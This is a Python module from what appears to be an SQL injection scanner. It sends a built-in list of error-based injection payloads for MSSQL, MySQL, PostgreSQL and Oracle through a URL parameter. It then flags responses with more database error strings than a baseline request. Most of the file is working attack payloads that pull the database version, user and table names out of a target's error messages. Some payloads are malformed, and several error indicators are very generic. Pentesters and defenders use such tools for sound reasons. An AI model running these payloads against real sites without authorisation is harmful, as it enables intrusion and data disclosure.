"""
Error-Based SQL Injection Engine
"""

import os
from utils.http_client import HttpClient

class ErrorEngine:
    def __init__(self):
        self.http_client = HttpClient()
        self.payloads_file = os.path.join("payloads", "error_payloads.txt")
        self.payloads = self._load_payloads()
    
    def _load_payloads(self):
        """Load error-based payloads from file"""
        default_payloads = [
            # MSSQL Error-based
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' OR 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CONVERT(int, (SELECT user_name()))--",
            "' OR 1=CONVERT(int, (SELECT user_name()))--",
            "' AND 1=CONVERT(int, (SELECT db_name()))--",
            "' OR 1=CONVERT(int, (SELECT db_name()))--",
            "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
            
            # MySQL Error-based
            "' AND ExtractValue(0,CONCAT(0x5c,@@version))--",
            "' OR ExtractValue(0,CONCAT(0x5c,@@version))--",
            "' AND UpdateXML(0,CONCAT(0x5c,@@version),0)--",
            "' OR UpdateXML(0,CONCAT(0x5c,@@version),0)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            
            # PostgreSQL Error-based
            "' AND 1=CAST((SELECT version()) AS int)--",
            "' OR 1=CAST((SELECT version()) AS int)--",
            "' AND 1=CAST((SELECT current_user) AS int)--",
            
            # Oracle Error-based
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--",
            "' OR 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--",
            
            # Generic error payloads
            "' AND 1=1 AND '1'='1", "' AND 1=2 AND '1'='1",
            "' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)y)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)y)--",
            
            # Division by zero
            "' AND 1/0--", "' OR 1/0--",
            "' AND (SELECT 1/0 FROM DUAL)--", "' OR (SELECT 1/0 FROM DUAL)--",
            
            # Type conversion errors
            "' AND 'a'='a' AND '1'=1--", "' AND 'a'='b' AND '1'=1--",
            "' AND CAST(@@version AS int)--", "' OR CAST(@@version AS int)--",
            
            # Stacked queries with errors
            "'; AND 1=CONVERT(int, (SELECT @@version))--",
            "'; OR 1=CONVERT(int, (SELECT @@version))--",
            
            # Boolean error-based
            "' AND GTID_SUBSET(@@version, 1)--", "' OR GTID_SUBSET(@@version, 1)--",
            "' AND GTID_SUBTRACT(@@version, 1)--", "' OR GTID_SUBTRACT(@@version, 1)--"
        ]
        
        try:
            if os.path.exists(self.payloads_file):
                with open(self.payloads_file, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                return payloads[:35]
            else:
                print(f"   Payload file not found: {self.payloads_file}, using defaults")
                return default_payloads
        except Exception as e:
            print(f"   Error loading payloads: {e}, using defaults")
            return default_payloads
    
    def test(self, param, url):
        """Test for error-based SQL injection"""
        try:
            baseline_response = self.http_client.get(url, {param: "1"})
            
            for payload in self.payloads:
                try:
                    response = self.http_client.get(url, {param: f"1{payload}"})
                    
                    if not response:
                        continue
                    
                    # Check for database error messages
                    if self._detect_database_errors(response, baseline_response):
                        return {
                            "vulnerable": True,
                            "payload": payload, 
                            "response": response,
                            "evidence": "Database error messages detected - information disclosure possible"
                        }
                        
                except Exception as e:
                    continue
            
            return None
        except Exception as e:
            print(f"   Error test error: {e}")
            return None
    
    def _detect_database_errors(self, response, baseline_response):
        """Detect database error messages in response"""
        if not response:
            return False
            
        # Database-specific error indicators
        error_indicators = [
            # MySQL
            "mysql", "mysqli", "mysql_fetch", "you have an error in your sql",
            "mysql_result", "mysql_num_rows", "mysql_", "mysqli_",
            
            # MSSQL
            "microsoft ole db", "sql server", "odbc driver", "convert",
            "microsoft sql", "sqlserver", "system.data.sqlclient",
            
            # Oracle
            "ora-", "oracle", "pl/sql", "oci", "tns", "oracle driver",
            
            # PostgreSQL
            "postgresql", "pg_", "postgres", "psql", "pqsql",
            
            # SQLite
            "sqlite", "sqlite3", "database disk image is malformed",
            
            # General SQL
            "sql syntax", "warning:", "error", "exception", "unclosed",
            "syntax error", "unexpected", "database", "query failed",
            "invalid query", "sql command", "db error", "pdo exception"
        ]
        
        response_lower = response.lower()
        
        # Count error indicators
        error_count = sum(1 for indicator in error_indicators if indicator in response_lower)
        
        # Check if we have more errors than baseline
        baseline_errors = 0
        if baseline_response:
            baseline_lower = baseline_response.lower()
            baseline_errors = sum(1 for indicator in error_indicators if indicator in baseline_lower)
        
        return error_count > baseline_errors + 2  # Significant increase in errors